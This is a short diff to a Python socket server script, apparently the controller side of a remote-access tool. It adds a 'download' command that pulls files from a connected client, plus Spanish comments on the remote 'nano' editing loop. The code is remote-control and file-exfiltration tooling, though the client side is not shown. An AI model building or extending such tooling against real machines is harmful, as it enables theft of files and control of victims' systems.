@@ -24,6 +24,10 @@ def create_folder():
         os.makedirs(path)
         print("[+] Folder was created.")
 
+def write_file(path, content):
+    with open(path, "wb") as file:
+       file.write(content)
+    return "[+] Complete Download."
 
 if __name__ == '__main__':
     try:
@@ -51,13 +55,13 @@ if __name__ == '__main__':
             elif command.startswith('nano -a'):
                 content = input(f'[*]{command[8:]} >>')
                 while content != 'exit nano':
-                    conn.send(content.encode())
-                    recv_msg = conn.recv(4096).decode()
-                    print(recv_msg)
+                    conn.send(content.encode())  # Enviar contenido como bytes
+                    recv_msg = conn.recv(4096).decode()  # Recibir mensaje del cliente
+                    print(recv_msg)  # Mostrar mensaje recibido del cliente
                     content = input(f'[*]{command[8:]} >>')
                 conn.send(content.encode())
-                recv_msg_exit = conn.recv(4096).decode()
-                print(recv_msg_exit)  
+                recv_msg_exit = conn.recv(4096).decode()  # Recibir mensaje de salida del cliente
+                print(recv_msg_exit)  # Mostrar mensaje de salida recibido del cliente
             elif command.startswith('nano -w'):
                 content = input(f'[*]{command[8:]} >>')
                 while content != 'exit nano':
@@ -66,9 +70,14 @@ if __name__ == '__main__':
                     content = input(f'[*]{command[8:]} >>')
                 conn.send(content.encode())
                 recv_msg_exit = conn.recv(4096).decode()
-                print(recv_msg_exit)                  
+                print(recv_msg_exit)
+            elif command.startswith("download"):
+                file_path = command.split(" ")[1]
+                file_content = conn.recv(9780639)
+                msg_recv = write_file(file_path, file_content)
+                print(msg_recv)             
             else:
-                recv = conn.recv(4096).decode()
+                recv = conn.recv(6780639).decode()
                 print(recv)
     except Exception as e:
         print("Error: ", e)
